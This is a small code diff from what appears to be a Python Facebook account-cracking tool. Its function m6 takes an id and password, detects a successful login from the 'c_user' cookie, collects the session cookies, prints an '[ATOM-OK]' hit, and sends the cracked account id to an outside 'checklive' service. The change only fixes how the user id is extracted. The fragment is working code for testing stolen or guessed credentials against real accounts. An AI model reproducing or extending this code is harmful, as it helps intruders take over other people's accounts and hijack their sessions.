@@ -1245,7 +1245,7 @@ def m6(idf,pwv):
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*?);', coki)
+    user = re.findall('c_user=(.*?);', coki)[0]
     print(f'\r\r{P}[ATOM-OK]:{user}')
     url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
